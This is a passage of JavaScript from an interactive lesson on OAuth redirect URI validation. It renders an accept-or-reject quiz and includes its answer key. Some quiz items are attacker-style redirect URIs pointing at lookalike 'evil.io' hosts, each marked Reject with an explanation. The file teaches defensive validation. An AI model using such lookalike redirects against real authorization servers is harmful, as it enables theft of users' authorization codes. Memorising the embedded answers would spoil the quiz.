      ['printapp-web', 'https://printapp.example.evil.io/callback', 'R', 'Different host (attacker-owned).'],
      ['printapp-web', 'http://printapp.example/callback', 'R', 'HTTP instead of HTTPS.'],
      ['printapp-desktop', 'http://127.0.0.1:51234/cb', 'A', 'Loopback redirect for native apps: any port is allowed (RFC 8252 §7.3).'],
      ['printapp-desktop', 'http://127.0.0.1.evil.io:51234/cb', 'R', 'Not loopback: it is a domain name.'],
    ];
    $('#ex').innerHTML = '<div class="card"><b>Registered</b><br><code>printapp-web</code>: <code>https://printapp.example/callback</code><br>' +
      '<code>printapp-desktop</code> (native): <code>http://127.0.0.1/cb</code></div><table class="t"><tr><th>client_id</th><th>Incoming redirect_uri</th><th>Decision</th></tr>' +
      Q.map((q, i) => '<tr><td class="mono">' + q[0] + '</td><td class="mono">' + esc(q[1]) + '</td><td><select id="q' + i + '"><option value="">choose…</option><option value="A">Accept</option><option value="R">Reject</option></select></td></tr>').join('') +
      '</table><button class="primary" id="chk" style="margin-top:8px">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) Q.forEach((q, i) => ($('#q' + i).value = q[2]));
    $('#chk').onclick = () => {
      const w = Q.map((q, i) => ($('#q' + i).value === q[2] ? null : i)).filter((x) => x !== null);
      if (!w.length) return feedback($('#fb'), true, '✅ All correct. Exact matching, with the single loopback-port exception for native apps.');
      feedback($('#fb'), false, '❌ ' + w.length + ' wrong:<ul>' + w.map((i) => '<li><code>' + esc(Q[i][1]) + '</code>' + ($('#q' + i).value ? ': ' + Q[i][3] : '') + '</li>').join('') + '</ul>');
    };
  }

  window.LESSONS.push(...L);
})();
